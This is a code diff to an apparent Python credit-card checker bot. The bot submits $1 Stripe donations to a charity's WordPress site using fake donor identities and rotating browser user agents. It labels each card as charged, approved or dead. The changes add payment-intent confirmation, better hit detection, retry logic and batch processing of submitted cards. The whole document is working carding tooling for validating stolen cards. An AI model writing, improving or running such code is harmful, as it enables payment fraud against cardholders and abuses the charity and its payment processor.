@@ -100,7 +100,7 @@ def create_pm(session, ua, pk, cc, mm, yy, cvc):
         'sid': sid,
         'payment_user_agent': 'stripe.js/33c734767c; stripe-js-v3/33c734767c; card-element',
         'referrer': 'https://ccfoundationorg.com',
-        'time_on_page': str(random.randint(5000, 15000)), # Reduced but realistic
+        'time_on_page': str(random.randint(5000, 15000)),
         'key': pk,
     }
     
@@ -113,7 +113,7 @@ def create_pm(session, ua, pk, cc, mm, yy, cvc):
     except Exception as e: return None, str(e)
 
 def pay(session, ua, form_data, pm):
-    """Execute the donation/payment."""
+    """Execute the donation/payment and handle hit detection."""
     fn, ln = fake.first_name(), fake.last_name()
     headers = {
         'accept': 'application/json, text/javascript, */*; q=0.01',
@@ -124,7 +124,6 @@ def pay(session, ua, form_data, pm):
         'x-requested-with': 'XMLHttpRequest',
     }
     
-    # Dynamic payload from form_data
     payload = {
         'charitable_form_id': form_data['charitable_form_id'],
         form_data['charitable_form_id']: '',
@@ -143,7 +142,7 @@ def pay(session, ua, form_data, pm):
         'address': fake.street_address(), 
         'postcode': fake.zipcode(), 
         'city': fake.city(),
-        'country': 'GB', # Site uses GBP
+        'country': 'GB',
         'gateway': 'stripe',
         'stripe_payment_method': pm,
         'action': 'make_donation',
@@ -152,27 +151,61 @@ def pay(session, ua, form_data, pm):
     
     try:
         r = session.post("https://ccfoundationorg.com/wp-admin/admin-ajax.php", headers=headers, data=payload, timeout=20)
-        res = r.json()
+        res_text = r.text
         
-        # Proper hit detection
-        if res.get('success'): 
-            return True, "APPROVED ✅ $1 Charged"
+        # Extract client_secret and payment_intent_id dynamically
+        # Usually found in response for Stripe 3DS or confirmation
+        client_secret_match = re.search(r'pi_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+', res_text)
+        if not client_secret_match:
+            # If no secret, maybe it's an immediate failure or success in the text
+            if "thank you" in res_text.lower() or "success" in res_text.lower():
+                return True, "Charged 1$ ✅ (Immediate)"
+            if "declined" in res_text.lower() or "error" in res_text.lower():
+                return False, f"Dead ❌ {res_text[:50]}"
+            return None, "Unknown Response"
+
+        client_secret = client_secret_match.group(0)
+        pi_id = client_secret.split('_secret_')[0]
         
-        errors = res.get('errors', [])
-        if errors:
-            msg = errors[0] if isinstance(errors, list) else str(errors)
-            # Differentiate between decline and error
-            if any(x in msg.lower() for x in ['decline', 'insufficient', 'invalid_cvc', 'expired']):
-                return False, f"DEAD ❌ {msg}"
-            return None, f"ERROR ⛔️ {msg}"
+        # Proper hit detection - Confirm Payment Intent
+        confirm_headers = {
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'user-agent': ua,
+        }
         
-        return False, "DEAD ❌ Card Declined"
+        confirm_data = {
+            'expected_payment_method_type': 'card',
+            'use_stripe_sdk': 'true',
+            'key': form_data['pk'],
+            'client_secret': client_secret
+        }
+        
+        confirm_url = f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm'
+        r_confirm = requests.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=20)
+        confirm_res = r_confirm.json()
+        
+        # Handle response
+        if 'error' in confirm_res:
+            err = confirm_res['error']
+            msg = err.get('message', 'Declined')
+            code = err.get('code', 'card_declined')
+            decline_code = err.get('decline_code', 'generic_decline')
+            return False, f"{msg} ({code} - {decline_code})"
+        
+        status = confirm_res.get('status')
+        if status == 'succeeded':
+            return True, "Charged 1$ ✅"
+        elif status == 'requires_action':
+            return True, "Approved ✅ (3DS Required)"
+        else:
+            return False, f"Dead ❌ Status: {status}"
+
     except Exception as e:
-        # Fallback check in response text
-        resp_text = r.text.lower() if 'r' in locals() else ""
-        if any(kw in resp_text for kw in ['thank', 'success', 'approved', 'charged']):
-            return True, "APPROVED ✅ $1 Charged (Text Match)"
-        return None, f"ERROR ⛔️ Connection Failed"
+        return None, f"Request Error: {str(e)}"
 
 def check_single_card(card_str):
     """Main logic for checking a single card with retries."""
@@ -184,8 +217,7 @@ def check_single_card(card_str):
     if len(yy) == 4: yy = yy[2:]
     card_info = f"{cc}|{mm}|{yy}|{cvc}"
     
-    # Retry logic: up to 2x for errors
-    max_retries = 3 # Initial + 2 retries
+    max_retries = 3
     for attempt in range(max_retries):
         session = requests.Session()
         ua = random.choice(MODERN_UAS)
@@ -197,7 +229,6 @@ def check_single_card(card_str):
 
         pm, err = create_pm(session, ua, form_data['pk'], cc, mm, yy, cvc)
         if not pm:
-            # If it's a card error, don't retry
             if any(x in str(err).lower() for x in ['decline', 'invalid', 'expired', 'cvc']):
                 return False, f"DEAD ❌ {err}", card_info
             if attempt < max_retries - 1: continue
@@ -210,7 +241,6 @@ def check_single_card(card_str):
         elif success is False:
             return False, result_msg, card_info
         else:
-            # It's an error, retry
             if attempt < max_retries - 1: continue
             return None, result_msg, card_info
             
@@ -317,7 +347,6 @@ def mass_handler(message):
         else:
             error_count += 1
         
-        # Update summary frequently (every 5 cards or so to avoid rate limits)
         if (charged_count + dead_count + error_count) % 5 == 0:
             update_summary()
     
